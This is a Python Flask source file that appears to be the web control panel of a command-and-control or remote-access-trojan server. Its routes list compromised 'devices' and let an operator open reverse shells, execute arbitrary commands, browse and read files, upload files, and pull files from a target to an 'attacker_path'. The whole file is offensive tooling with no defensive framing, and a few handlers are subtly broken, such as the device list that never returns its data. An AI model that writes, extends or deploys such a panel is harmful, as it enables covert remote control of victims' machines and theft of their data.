from Utils import *
from Web.Endpoints.authorization import authorized, admin


def devices_enpoints(Server):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def devices_index():
        return render_template("devices/index.html")

    @devices_bp.route("/list", methods=["GET"])
    @authorized
    def devices_list():
        # Get the list of devices
        curr.execute("SELECT * FROM devices")
        devices = curr.fetchall()
        data = []
        for device in devices:
            try:
                Server.get_device(device[0])
            except:
                active = False
            else:
                active = True
            data.append({
                "id": device[0],
                "hostname": device[1],
                "address": device[2],
                "connection_date": device[3],
                "last_seen": device[4],
                "status": active
            })

    @devices_bp.route("/revshell", methods=["POST"])
    @authorized
    def revshell():
        id = request.form.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            Server.get_device(id).revshell(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
        else:
            return jsonify({"status": "success", "message": "Reverse Shell Opened"})

    @devices_bp.route("/rce", methods=["POST"])
    @authorized
    def rce():
        id = request.form.get("id")
        cmd = request.form.get("cmd")
        try:
            output = Server.get_device(id).rce(cmd)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/infos", methods=["GET"])
    @authorized
    def infos():
        id = request.args.get("id")
        output = Server.get_device(id).infos()
        try:
            output = Server.get_device(id).infos()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/dir", methods=["GET"])
    @authorized
    def dir():
        id = request.args.get("id")
        dir = request.args.get("dir")
        try:
            output = Server.get_device(id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/file", methods=["GET"])
    @authorized
    def file():
        id = request.args.get("id")
        path = request.args.get("path")
        try:
            output = Server.get_device(int(id)).get_file_contents(path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/upload", methods=["POST"])
    @authorized
    def upload():
        id = request.form.get("id")
        fil = request.form.get("fil")
        path = request.form.get("path")
        try:
            output = Server.get_device(id).file_upload(fil)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/download", methods=["POST"])
    @authorized
    def download():
        id = request.form.get("id")
        target_path = request.form.get("target_path")
        attacker_path = request.form.get("attacker_path")
        try:
            output = Server.file_download(
                id, target_path, attacker_path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})
    return devices_bp
